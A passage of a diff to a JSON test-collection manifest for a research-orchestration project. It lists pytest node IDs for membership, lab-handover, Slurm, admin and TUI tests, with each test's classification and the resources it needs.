@@ -1,9 +1,9 @@
 {
   "schema_version": 1,
   "status": "COLLECTED",
-  "collected_at": "2026-10-17 13:54:49 +0800",
-  "source_sha": "6125adc342f4fa744eaac8a019470818955446dd",
-  "source_digest": "a4b44792bdefa44e86c765fa9b734bbb1f893c7cb0d4b27468e4ccba2ed6cb47",
+  "collected_at": "2026-10-17 15:20:14 +0800",
+  "source_sha": "7cca83e4bddffb2fa4017267c63e136c0ca15baa",
+  "source_digest": "dd77b4720d5480b8df312ce3079b03581859c3faa0d42df66fda3ddc8c2dd459",
   "collection_command": "python -m pytest -q --strict-markers --import-mode=importlib --collect-only -q --import-mode=importlib -p no:cacheprovider",
   "collection_exit": 0,
   "tests": [
@@ -191,6 +191,13 @@
     },
     {
       "nodeid": "tests/acceptance/test_lab.py::test_a12_master_answers_the_deviation_and_the_history_survives",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase10_agents.py::test_l27_a_node_nobody_can_run_is_named_to_master",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -393,6 +400,13 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/acceptance/test_phase10_backends.py::test_the_real_compute_backend_is_not_what_a_default_deployment_runs",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/acceptance/test_phase10_dsh.py::test_p10_01_the_latest_release_was_re_evaluated",
       "classification": "external",
       "reason": "live research or live harness acceptance",
@@ -430,6 +444,17 @@
       "external_resources": [
         "DEEPSEEK_API_KEY",
         "internet"
+      ]
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase10_live.py::test_p10_17_a_research_driven_run_ends_on_its_evidence",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
       ]
     },
     {
@@ -603,6 +628,368 @@
     },
     {
       "nodeid": "tests/acceptance/test_phase10_supervisor.py::test_p10_w20_no_run_bypasses_the_worker_that_owns_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_certification.py::test_p11_11_live_agents_drive_the_whole_chain_to_a_conclusion",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_certification.py::test_p11_11_one_project_runs_the_whole_chain_to_a_conclusion",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_a_methods_parameter_is_read_out_of_the_body_and_cited",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_a_real_papers_body_is_read_and_quoted",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_a_scanned_paper_is_reported_and_never_invented",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_a_stored_paper_is_read_again_by_the_page_it_is_on",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_reading_a_source_changes_nothing_about_the_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_deepread.py::test_p11_02_the_reading_surface_belongs_to_the_ledgers_author",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_humanlab.py::test_p11_06_a_bench_that_reports_a_deviation_stops_the_run_for_master",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_humanlab.py::test_p11_06_a_delivery_that_does_not_cover_what_is_owed_does_not_finish_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_humanlab.py::test_p11_06_masters_contract_reaches_a_bench_and_comes_back_as_a_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_materialization.py::test_p11_04_a_contract_this_deployment_cannot_build_reaches_master",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_materialization.py::test_p11_04_the_same_contract_prepares_where_the_environment_exists",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_a_lab_user_and_an_administrator_cannot_manage_members",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_a_person_is_made_at_a_terminal_and_not_over_http",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_a_project_never_loses_its_owner",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_an_administrator_is_not_a_platform_superuser",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_an_owner_adds_accounts_that_already_exist",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_an_owner_opens_a_project_and_the_ownership_is_a_row",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_authority_comes_from_the_row_and_not_the_token",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_membership.py::test_p11_08_every_membership_change_is_a_fact_on_the_record",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_readback.py::test_p11_03_a_task_that_has_not_handed_over_is_not_a_result_yet",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_readback.py::test_p11_03_master_reads_the_result_a_research_seat_handed_over",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_readback.py::test_p11_03_the_masters_turn_points_at_the_result_it_can_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_readback.py::test_p11_03_the_readback_belongs_to_master_and_to_nobody_else",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_lost_run_leaves_a_question_and_no_scientific_verdict",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_node_whose_workflow_was_never_started_is_recovered",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_run_that_died_writing_its_result_does_not_strand_its_node",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_run_that_is_still_alive_is_left_alone",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_supervisor_recovers_a_run_that_died_before_it_started",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_a_terminated_run_is_recovered_as_a_cancellation",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_master_is_told_what_happened_to_the_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_sweeping_twice_finds_the_loss_once",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_reconcile.py::test_p11_01_the_supervisor_does_not_start_a_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_release_gate.py::test_p11_07_a_row_that_did_not_run_is_not_a_row_that_passed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_release_gate.py::test_p11_07_a_row_that_names_a_file_that_does_not_exist_is_caught",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_release_gate.py::test_p11_07_a_skip_nobody_can_attribute_is_reported_as_one",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_release_gate.py::test_p11_07_every_area_phase_11_promises_is_a_row",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_release_gate.py::test_p11_07_one_failed_row_is_not_certified_whatever_the_others_say",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_roles.py::test_p11_09_an_administrator_can_neither_approve_nor_mutate_anything",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_roles.py::test_p11_09_no_two_roles_are_drawn_by_the_same_screen",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_roles.py::test_p11_09_the_benchs_screen_hands_the_work_back_through_the_console",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_roles.py::test_p11_09_the_operators_screen_carries_every_thing_the_item_lists",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_roles.py::test_p11_09_the_owners_screen_carries_every_thing_the_item_lists",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_services.py::test_p11_10_a_project_survives_the_supervisor_that_was_driving_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_services.py::test_p11_10_systemd_restarts_a_killed_supervisor_and_a_stopped_one_says_so",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_services.py::test_p11_10_the_services_endpoint_separates_the_four_states",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_slurm.py::test_p11_05_a_real_cluster_runs_the_workspace_preparation_built",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_slurm.py::test_p11_05_a_worker_told_to_use_a_cluster_it_was_not_given_refuses_to_start",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/acceptance/test_phase11_slurm.py::test_p11_05_the_cluster_password_reaches_the_worker_and_nothing_else",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -946,6 +1333,18 @@
       ]
     },
     {
+      "nodeid": "tests/e2e/test_tui.py::test_a_lab_user_cannot_attach_a_file_to_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
       "nodeid": "tests/e2e/test_tui.py::test_a_lab_user_reports_a_deviation_and_nothing_moves",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -970,7 +1369,7 @@
       ]
     },
     {
-      "nodeid": "tests/e2e/test_tui.py::test_a_lab_user_uploads_a_result_and_the_bytes_reach_the_store",
+      "nodeid": "tests/e2e/test_tui.py::test_a_lab_user_sees_what_was_handed_over_and_said",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -1006,6 +1405,30 @@
       ]
     },
     {
+      "nodeid": "tests/e2e/test_tui.py::test_an_admin_sees_the_processes_the_jobs_and_the_recoveries",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
+      "nodeid": "tests/e2e/test_tui.py::test_an_owner_reads_research_evidence_and_approvals",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
       "nodeid": "tests/e2e/test_tui.py::test_an_owner_sees_the_project_its_graph_and_its_master",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -1030,6 +1453,18 @@
       ]
     },
     {
+      "nodeid": "tests/e2e/test_tui.py::test_the_administrators_screen_cannot_write_anything",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
       "nodeid": "tests/e2e/test_tui.py::test_the_gateway_never_reaches_for_a_dag_mutation",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -1042,7 +1477,43 @@
       ]
     },
     {
+      "nodeid": "tests/e2e/test_tui.py::test_the_new_project_box_is_not_the_add_member_box",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
+      "nodeid": "tests/e2e/test_tui.py::test_the_owner_adds_and_withdraws_a_member_from_the_console",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
       "nodeid": "tests/e2e/test_tui.py::test_the_owner_can_stop_and_start_the_project",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio",
+        "playwright"
+      ]
+    },
+    {
+      "nodeid": "tests/e2e/test_tui.py::test_the_owner_opens_a_project_and_can_then_reach_it",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -1278,6 +1749,149 @@
     },
     {
       "nodeid": "tests/integration/backends/test_compute_scenarios.py::test_submitting_the_same_attempt_twice_returns_the_same_job",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_bench_is_never_reported_as_running",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_delivery_can_carry_a_report_and_this_backend_decides_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_delivery_that_claims_what_it_never_uploaded_cannot_finish_the_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_node_under_another_contract_version_is_a_different_handover",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_reference_this_backend_did_not_issue_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_report_nothing_is_waiting_on_is_not_delivered",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_run_with_no_prepared_package_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_a_simulated_artifact_cannot_answer_an_output",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_an_upload_is_recorded_with_who_what_when_and_against_which_contract",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_handing_the_same_attempt_over_twice_hands_it_over_once",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_the_handover_records_what_the_bench_was_given",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_the_run_finishes_when_every_owed_output_has_been_recorded",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_lab_backend.py::test_withdrawing_a_handover_stops_ravel_waiting_and_claims_nothing_else",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -1564,6 +2178,105 @@
     },
     {
       "nodeid": "tests/integration/backends/test_simulation_is_marked.py::test_the_ledger_refuses_a_source_resting_on_simulated_bytes",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_a_file_that_changed_between_reads_becomes_a_second_version",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_a_missing_required_output_is_reported_rather_than_raised",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_a_real_output_is_filed_under_the_project_that_ran_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_a_run_directory_the_scheduler_forgot_collects_nothing_and_says_why",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_an_output_the_contract_named_as_a_path_is_found_by_that_path",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_collecting_twice_files_one_version",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_collecting_without_an_object_store_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_the_bytes_in_the_store_are_the_bytes_the_cluster_held",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/backends/test_slurm_collection.py::test_the_credential_is_not_in_what_collection_records",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -2399,6 +3112,28 @@
       ]
     },
     {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_lab_user_may_see_the_processes_and_not_the_estate",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_member_may_ask_whether_the_supervisor_is_alive",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/gateway/test_admin.py::test_a_nodes_backend_attempts_are_readable_and_a_stranger_is_not",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -2411,6 +3146,116 @@
     },
     {
       "nodeid": "tests/integration/gateway/test_admin.py::test_a_pool_that_was_never_built_is_not_a_pool_with_nothing_in_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_project_with_no_jobs_answers_with_zeroes_rather_than_an_empty_body",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_project_with_no_jobs_has_an_empty_list_and_not_an_inventory",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_project_with_no_recoveries_says_zero_rather_than_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_recovery_is_reported_with_what_the_probe_actually_saw",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_report_with_no_cadence_in_it_gets_the_floor",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_reporting_service_says_how_long_it_has_been_quiet",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_service_polling_faster_than_the_floor_gets_the_floor",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_service_that_never_reported_is_not_a_service_that_died",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_service_that_stopped_beating_is_stale_and_named",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_a_stranger_is_told_the_project_is_not_theirs",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -2454,7 +3299,51 @@
       ]
     },
     {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_jobs_are_split_by_the_transition_table_and_not_by_a_list_here",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/gateway/test_admin.py::test_no_token_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_no_token_is_refused_by_the_new_reads",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_the_backends_panel_reports_what_the_work_was_handed_to",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_the_gateway_does_not_probe_the_cluster_and_says_so",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -2488,6 +3377,28 @@
     },
     {
       "nodeid": "tests/integration/gateway/test_admin.py::test_the_runtime_screen_counts_what_is_there",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_the_slurm_panel_names_the_setting_and_never_the_secret",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_admin.py::test_the_supervisors_disclosure_about_other_projects_is_a_count",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -3224,6 +4135,358 @@
       ]
     },
     {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_corrected_file_is_a_new_version_of_the_same_output",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_document_a_task_has_no_handover_for_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/gateway/test_lab_handover.py::test_a_document_is_served_from_the_package_the_manifest_listed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
